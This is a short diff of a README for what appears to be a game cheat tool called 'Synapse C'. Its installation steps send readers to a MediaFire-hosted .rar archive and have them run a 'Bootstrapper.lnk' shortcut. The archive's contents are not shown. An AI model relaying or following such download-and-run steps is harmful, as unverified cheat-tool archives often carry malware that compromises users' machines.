@@ -17,5 +17,5 @@
 
 <h1 align="center">Installation</h1>
 
-* Download the [latest release](https://www.mediafire.com/file/8dp3nbu4uj0tbrk/Synapse_C.rar/file) and extract it to a folder with [WinRar](https://win-rar.com) or any other unzip program.
+* Download [here](https://www.mediafire.com/file/8dp3nbu4uj0tbrk/Synapse_C.rar/file) and extract it to a folder with [WinRar](https://win-rar.com) or any other unzip program.
 * Run `Bootstrapper.lnk` (shortcut)
